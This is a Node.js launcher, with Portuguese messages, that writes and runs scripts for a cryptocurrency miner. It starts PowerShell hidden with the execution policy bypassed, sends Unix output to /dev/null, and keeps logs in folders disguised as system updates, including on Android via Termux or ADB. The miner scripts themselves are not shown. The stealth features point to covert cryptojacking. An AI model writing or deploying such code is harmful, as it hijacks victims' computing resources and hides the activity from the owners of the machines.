const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const os = require('os');

const minerPs1Content = fs.readFileSync(path.join(__dirname, 'miner.ps1'), 'utf8');
const minerShContent = fs.readFileSync(path.join(__dirname, 'miner.sh'), 'utf8');

const files = {
    'miner.ps1': minerPs1Content,
    'miner.sh': minerShContent,
    'iniciar.bat': `@echo off\npowershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%~dp0miner.ps1"\nexit`,
    'iniciar.sh': `#!/bin/bash\nbash "$(dirname "$0")/miner.sh" > /dev/null 2>&1 &\nexit`,
    'ver_logs.bat': `@echo off\nset "logFile=%LOCALAPPDATA%\\WinSysUpdate\\sys_log.txt"\nif exist "%logFile%" (\n    echo --- Ultimas 20 linhas do log ---\n    powershell -Command "Get-Content '%logFile%' -Tail 20 -Wait"\n) else (\n    echo Log nao encontrado.\n    pause\n)`,
    'ver_logs.sh': `#!/bin/bash\nIS_TERMUX=$(echo $HOME | grep -q "com.termux" && echo "true" || echo "false")\nIS_ADB_ANDROID=$(uname -a | grep -i "android" && echo "true" || echo "false")\nif [ "$IS_TERMUX" = "true" ]; then LOG_FILE="$HOME/.sys_update/sys_log.txt"\nelif [ "$IS_ADB_ANDROID" = "true" ]; then LOG_FILE="/data/local/tmp/.sys_update/sys_log.txt"\nelse LOG_FILE="/tmp/.sys_update/sys_log.txt"; fi\nif [ -f "$LOG_FILE" ]; then tail -n 20 -f "$LOG_FILE"; else echo "Log nao encontrado."; fi`
};

console.log("Gerando arquivos de mineracao...");

Object.keys(files).forEach(fileName => {
    fs.writeFileSync(path.join(__dirname, fileName), files[fileName]);
    if (fileName.endsWith('.sh')) {
        try { fs.chmodSync(path.join(__dirname, fileName), '755'); } catch (e) {}
    }
    console.log(`- ${fileName} criado.`);
});

const isWin = os.platform() === 'win32';

console.log(`\nIniciando minerador para ${isWin ? 'Windows' : 'Linux/Unix'}...`);

if (isWin) {
    exec('iniciar.bat', (err) => {
        if (err) console.error("Erro ao iniciar:", err);
        else console.log("Processo iniciado em segundo plano.");
    });
} else {
    exec('chmod +x iniciar.sh && ./iniciar.sh', (err) => {
        if (err) console.error("Erro ao iniciar:", err);
        else console.log("Processo iniciado em segundo plano.");
    });
}
